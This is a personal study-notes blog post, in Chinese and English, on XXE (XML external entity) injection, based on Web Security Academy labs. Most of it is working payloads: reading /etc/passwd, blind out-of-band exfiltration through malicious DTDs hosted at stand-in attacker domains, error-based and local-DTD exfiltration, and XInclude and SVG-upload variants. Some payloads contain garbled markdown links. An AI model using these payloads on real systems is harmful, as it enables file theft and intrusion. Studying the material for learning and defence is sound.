---
layout: article
title: WSAcademy 9 -- XXE
mathjax: true
key: a00020
cover: /bkgs/1.png
modify_date: 2021-10-18
show_author_profile: true
excerpt_type: html
tag: 
- WSAcademy
- XXE
mode: immersive
header:
  theme: dark
article_header:
  type: overlay
  theme: dark
  background_color: '#203028'
  background_image:
    gradient: 'linear-gradient(135deg, rgba(34, 139, 87 , .4), rgba(139, 34, 139, .4))'
    src: /docs/assets/images/cover3.jpg
---

这篇是Web Security Academy的XXE部分<!--more-->,从顺序上来说其实是先看的一篇XXE文章，这篇文章参考了很多Academy上的，后来才开始的，算是这个系列梦开始的地方hhhh （[xxe-from-zero-to-hero](https://newrouge.medium.com/xxe-from-zero-to-hero-b38118750556)),很多内容是后面补上去的所有结构和其他看着不太一样。

原文：[What is SSRF (Server-side request forgery)](https://portswigger.net/web-security/ssrf)

# 1.concept

Now XXE stands for *XML External Entity*

XXE(XML External Entity Injection) 全称为 XML 外部实体注入



XML stands for extensible markup language

XML is a language designed for storing and transporting data

 

docx,xlsx,pptx all are XML file types

But its popularity has now declined in favor of the JSON format

**xml被json取代了**

 

in XML All tags are needed to be closed

(the "X" in "AJAX" stands for "XML")

漏洞产生原因：应用使用了XML来传输或存储data，XML标准包含有潜在风险的特性，并且标准解释器支持能造成XXE的特性



# 2.XML Entities 

 For example, the entities `&lt; and &gt;` represent the characters < and >

we call these entities(variable) by “&ENTITY_NAME"

 

XML custom entities?

```xml
<!DOCTYPE foo [ <!ENTITY myentity "my entity value" > ]>
```

 

XML external entities

外部实体的声明使用SYSTEM 关键字，并且必须指定一个URL，从中加载实体的值

example: 

```xml
<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://normal-website.com" > ]>
<!DOCTYPE foo [ <!ENTITY ext SYSTEM "[file:///path/to/file](file://path/to/file)" > ]>
```

foo就是根元素

&xxe;   通用实体 DTD顶i有，XML引用

% xxe   参数实体  DTD定义，DTD使用 %xxe;

**文档类型定义（DTD）可定义合法的XML文档构建模块**

can define the structure of an XML document

# 3.exploit

## 1.Exploiting XXE to retrieve files

[Lab: Exploiting XXE using external entities to retrieve files](https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files)

example

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "[file:///etc/passwd](file://etc/passwd)"> ]>
<stockCheck>
<productId>&xxe;</productId><storeId>1</storeId>
</stockCheck>
```

（***SYSTEM*** keyword is used which instruct the DTD to load data from the following URI）

DTD就是整个payload entity在里面（xxe）



2.Blind XXE vulnerabilities

- 定向到自己的服务器

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> ]>
```

- 利用错误信息传递返回结果

### PARAMETRIC ENTITIES:

自定义ENTITY被ban

```xml
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>
```

### Exploiting blind XXE to exfiltrate data out-of-band

利用服务器上的xml代码读取并传送敏感数据到服务器

```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
```

### 服务器dtd file

1.

```xml
<!ENTITY % file SYSTEM "[file:///etc/passwd](file://etc/passwd)">
<!ENTITY % eval "<!ENTITY &#x25（就是%）; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```

 

2.

```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>

<!DOCTYPE data [ <!ENTITY % file SYSTEM “[file:///etc/passwd](file://etc/passwd)"> 
<!ENTITY % dtd SYSTEM “http://attacker.com/evil.dtd">%dtd; ]>
```

evil.dtd:

```xml
<!ENTITY % all “<!ENTITY send SYSTEM ‘*[*http://attacker.com/?collect=%file;'*](http://attacker.com/?collect=%file;')*>">*
执行
%all;
```



## 2.Exfiltration by error message:

e.g.

dtd file：

```xml
<!ENTITY % file SYSTEM "[file:///etc//passwd](file://etc/passwd)">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM '[file:///invalid/%file;](file://invalid/%file;)'>">
%eval;
%error;
```

下面内容发送就会返回错误信息和目标内容

```xml
<!DOCTYPE qwe [<!ENTITY % xxe SYSTEM "https://ace41f551f39382680152c320184001d.web-security-academy.net/exploit.dtd">%xxe;]>
```

so final output contains error not found /nonexistent/<output of /etc/passwd>

## 3.Blind XXE by repurposing a local DTD:

混合使用 internal and external DTD declarations时，内部dtd可以重新定义外部dtd

利用：在internal DTD里触发error-based xxe

like：

```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "[file:///usr/local/app/schema.dtd](file://usr/local/app/schema.dtd)">
<!ENTITY % custom_entity '
<!ENTITY &#x25; file SYSTEM "[file:///etc/passwd](file://etc/passwd)">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```

定义一个local_dtd实体，包含在服务器内部的外部实体并从定义实体，使其读取文件并用过报错的方式传输文件

```xml
<?xml version="1.0"?>
<!DOCTYPE foo[
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
    <!ENTITY % ISOamso '
    <!ENTITY &#x25; file SYSTEM "file:///flag">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
'>
%local_dtd;
]>
```

找本地的DTD文件：

可以根据error信息找

GNOME有/usr/share/yelp/dtd/docbookx.dtd

```xml
<!DOCTYPE foo [<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">%local_dtd;]>
```

# 3.Finding hidden attack surface for XXE injection

## XInclude attacks

```xml
example：
original： productId=1&storeId=1

set：
productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
```

## XXE attacks via file upload

有时上传的文件可以包含xml，比如DOCX或者SVG

example：svg图片

```xml
<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
```

## XXE attacks via modified content type

```xml
original：
Content-Type: application/x-www-form-urlencoded 
foo=bar

set：
Content-Type: text/xml
<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
```



HOW TO PREVENT:disable resolution of external entities and disable support for XInclude

后续参考链接：[一篇文章带你深入理解漏洞之 XXE 漏洞 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/3357#toc-8)